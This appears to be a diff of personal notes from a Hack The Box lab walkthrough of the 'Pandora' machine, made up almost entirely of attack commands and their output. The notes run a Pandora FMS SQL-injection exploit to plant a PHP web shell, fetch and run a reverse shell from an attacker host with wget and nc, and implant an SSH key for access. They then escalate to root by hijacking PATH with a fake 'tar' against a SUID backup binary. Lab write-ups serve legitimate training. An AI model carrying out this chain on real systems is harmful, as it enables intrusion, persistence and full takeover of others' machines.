@@ -1624,4 +1624,179 @@ sqlmap -u 'http://127.0.0.1:8888/pandora_console/include/chart_generator.php?ses
 OR
 https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/blob/master/sqlpwn.py
 
+──(kali㉿kali)-[~/htb/htb/Pandora_10.10.11.136]
+└─$ python3 sqlpwn.py -t 127.0.0.1:8888 -f shell.php 
+URL:  http://127.0.0.1:8888/pandora_console
+[+] Sending Injection Payload
+[+] Requesting Session
+[+] Admin Session Cookie : 9q3jccj3ll96uap2tmvlmrjrmg
+[+] Sending Payload 
+[+] Respose : 200
+[+] Pwned :)
+[+] If you want manual Control : http://127.0.0.1:8888/pandora_console/images/shell.php?test=
+CMD > cat /home/matt/user.txt
+6f123e7941f85ed6c0421a63423a29ce
+
+CMD > wget http://10.10.14.7:8000/shell.php -O /tmp/shell.php
+CMD > php /tmp/shell.php
+
+Got a shell of matt:
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb# nc -nlvp 1234
+Listening on [0.0.0.0] (family 0, port 1234)
+Connection from 10.10.11.136 42800 received!
+Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+ 11:49:48 up  9:31,  1 user,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+daniel   pts/0    10.10.14.7       02:24   14:52   0.04s  0.04s -bash
+uid=1000(matt) gid=1000(matt) groups=1000(matt)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=1000(matt) gid=1000(matt) groups=1000(matt)
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+/bin/sh: 2: python: not found
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+matt@pandora:/$ cd
+cd
+bash: cd: HOME not set
+matt@pandora:/$ cd /home/matt
+cd /home/matt
+matt@pandora:/home/matt$ ls
+ls
+user.txt
+matt@pandora:/home/matt$ ls -la
+ls -la
+total 24
+drwxr-xr-x 2 matt matt 4096 Dec  7 15:00 .
+drwxr-xr-x 4 root root 4096 Dec  7 14:32 ..
+lrwxrwxrwx 1 matt matt    9 Jun 11  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 matt matt  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 matt matt 3771 Feb 25  2020 .bashrc
+-rw-r--r-- 1 matt matt  807 Feb 25  2020 .profile
+-rw-r----- 1 root matt   33 May 24 02:18 user.txt
+matt@pandora:/home/matt$ sudo -l
+sudo -l
+sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted
+sudo: unable to initialize policy plugin
+matt@pandora:/home/matt$ find / -user root -perm -4000 -print 2>/dev/null
+find / -user root -perm -4000 -print 2>/dev/null
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/umount
+/usr/bin/pandora_backup
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/fusermount
+/usr/bin/chsh
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+matt@pandora:/home/matt$ ls -la /usr/bin/pandora_backup
+ls -la /usr/bin/pandora_backup
+-rwsr-x--- 1 root matt 16816 Dec  3 15:58 /usr/bin/pandora_backup
+
+matt@pandora:/home/matt$ /usr/bin/pandora_backup
+/usr/bin/pandora_backup
+PandoraFMS Backup Utility
+Now attempting to backup PandoraFMS client
+tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
+tar: Error is not recoverable: exiting now
+Backup failed!
+Check your permissions!
+
+Need to ssh to matt normally, with .ssh.
+
+
+RSA seems not work, even the length is 3072, have to try ed25519.
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
+|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
+|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
+
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Pandora_10.10.11.136# ssh-keygen -t ed25519
+Generating public/private ed25519 key pair.
+Enter file in which to save the key (/root/.ssh/id_ed25519): ./id_ed25519
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
+Your identification has been saved in ./id_ed25519.
+Your public key has been saved in ./id_ed25519.pub.
+The key fingerprint is:
+SHA256:0ko7Amq/zH1yeqOixHN5ZOwIiPxaKSQZeiK/3Po10F8 root@ubuntu-s-1vcpu-1gb-sfo2-01
+The key's randomart image is:
++--[ED25519 256]--+
+|                 |
+|                 |
+|.                |
+|=o  .. .         |
+|O+o .++ S E      |
+|==o.Bo = .       |
+|.*.B.o* .        |
+|o.X+o+ B         |
+| o=B=+B .        |
++----[SHA256]-----+
+
+matt@pandora:~/.ssh$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAaHbL1rd13iLq7hmpZycfM2Mvrfd/39sS82l2H35jwd root@ubuntu-s-1vcpu-1gb-sfo2-01" > authorized_keys
+
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Pandora_10.10.11.136# ssh -i id_ed25519 matt@10.10.11.136
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue 24 May 13:43:46 UTC 2022
+
+  System load:           0.0
+  Usage of /:            63.2% of 4.87GB
+  Memory usage:          15%
+  Swap usage:            0%
+  Processes:             243
+  Users logged in:       1
+  IPv4 address for eth0: 10.10.11.136
+  IPv6 address for eth0: dead:beef::250:56ff:feb9:b524
+
+  => /boot is using 91.8% of 219MB
+  => There is 1 zombie process.
+
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+/usr/bin/xauth:  file /home/matt/.Xauthority does not exist
+matt@pandora:~$ sudo -l
+[sudo] password for matt:
+matt@pandora:/tmp$ export PATH=./:$PATH
+matt@pandora:/tmp$ echo $PATH
+./:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+matt@pandora:/tmp$ echo "/bin/bash -p" > tar
+matt@pandora:/tmp$ chmod +x tar
+matt@pandora:/tmp$ ls -la tar
+-rwxrwxr-x 1 matt matt 13 May 24 13:55 tar
+matt@pandora:/tmp$ /usr/bin/pandora_backup
+PandoraFMS Backup Utility
+Now attempting to backup PandoraFMS client
+root@pandora:/tmp# id
+uid=0(root) gid=1000(matt) groups=1000(matt)
+root@pandora:/tmp# cat /root/*.txt
+d599917d382bb9f40a51046eb383348a
 
